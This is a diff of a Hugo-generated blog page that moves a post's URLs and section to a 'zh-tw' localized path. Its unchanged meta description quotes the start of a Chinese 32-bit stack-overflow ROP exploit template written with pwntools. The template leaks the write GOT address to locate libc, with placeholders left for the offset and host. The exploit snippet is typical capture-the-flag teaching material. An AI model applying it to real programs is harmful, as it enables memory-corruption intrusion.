@@ -23,7 +23,7 @@
 <meta property="og:title" content="32位栈溢出rop模板" />
 <meta property="og:description" content="32位栈溢出rop模板（无PIE） #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = &#39;debug&#39; process_name = &#39;./&#39; #p = process([process_name], env={&#39;LD_LIBRARY_PATH&#39;:&#39;./&#39;}) p = remote(&#39;&#39;, ) elf = ELF(process_name) #**************泄露got并寻找libc def send_payload(payload): payload = &#39;A&#39;*(偏移) &#43; payload p.sendlineafter(&#39;&#39;, payload) main_addr = write_plt = elf.plt[&#39;write&#39;] write_got = elf.got[&#34;write&#34;] payload = p32(write_plt) &#43; p32(main_addr) &#43; p32(1) &#43; p32(write_got) &#43; p32(4) send_payload(payload) write_addr = u32(p.recvn(4)) log.info(&#34;write_addr =&gt; %#x&#34;, write_addr) libc = LibcSearcher(&#39;write&#39;, write_addr) libc_base = write_addr - libc." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://hugo-toha.github.io/posts/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/" /><meta property="article:section" content="posts" />
+<meta property="og:url" content="https://hugo-toha.github.io/zh-tw/posts/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/" /><meta property="article:section" content="zh-tw" />
 <meta property="article:published_time" content="2021-07-11T17:26:35+08:00" />
 <meta property="article:modified_time" content="2021-07-11T17:26:35+08:00" />
 
@@ -188,7 +188,7 @@ p<span style="color:#f92672">.</span>interactive()
         
         
           <div class="btn-improve-page">
-              <a href="https://github.com/hugo-toha/hugo-toha.github.io/edit/main/content/posts%5c32%e4%bd%8d%e6%a0%88%e6%ba%a2%e5%87%barop%e6%a8%a1%e6%9d%bf%28%e6%97%a0PIE%29.md" title="Improve this page" target="_blank" rel="noopener">
+              <a href="https://github.com/hugo-toha/hugo-toha.github.io/edit/main/content/zh-tw%5cposts%5c32%e4%bd%8d%e6%a0%88%e6%ba%a2%e5%87%barop%e6%a8%a1%e6%9d%bf%28%e6%97%a0PIE%29.md" title="Improve this page" target="_blank" rel="noopener">
                 <i class="fas fa-code-branch"></i>
                 Improve this page
               </a>
